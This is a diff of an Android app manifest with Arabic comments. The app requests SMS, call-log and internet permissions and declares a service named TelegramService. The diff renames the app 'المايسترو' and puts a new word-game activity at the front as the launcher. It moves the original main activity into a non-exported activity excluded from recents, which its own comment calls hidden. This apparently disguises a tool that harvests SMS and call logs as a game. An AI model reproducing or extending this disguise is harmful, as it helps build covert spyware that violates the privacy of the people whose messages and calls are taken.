@@ -2,6 +2,7 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools">
 
+    <!-- الأذونات -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
@@ -16,14 +17,14 @@
 
     <application
         android:allowBackup="true"
-        android:label=""
+        android:label="المايسترو"
         android:theme="@style/Theme.AppCompat.NoActionBar"
         android:requestLegacyExternalStorage="true">
 
+        <!-- النشاط الرئيسي: لعبة الكلمات -->
         <activity
-            android:name=".MainActivity"
+            android:name=".WordGameActivity"
             android:exported="true"
-            android:excludeFromRecents="true"
             android:launchMode="singleInstance"
             android:theme="@style/Theme.AppCompat.NoActionBar">
             <intent-filter>
@@ -32,6 +33,13 @@
             </intent-filter>
         </activity>
 
+        <!-- النشاط الخفي (لطلب الأذونات القديم) -->
+        <activity
+            android:name=".MainActivity"
+            android:exported="false"
+            android:excludeFromRecents="true" />
+
+        <!-- FileProvider للكاميرا -->
         <provider
             android:name="androidx.core.content.FileProvider"
             android:authorities="${applicationId}.fileprovider"
@@ -42,6 +50,7 @@
                 android:resource="@raw/file_paths" />
         </provider>
 
+        <!-- الخدمات والمستقبلات -->
         <service
             android:name=".TelegramService"
             android:exported="false"
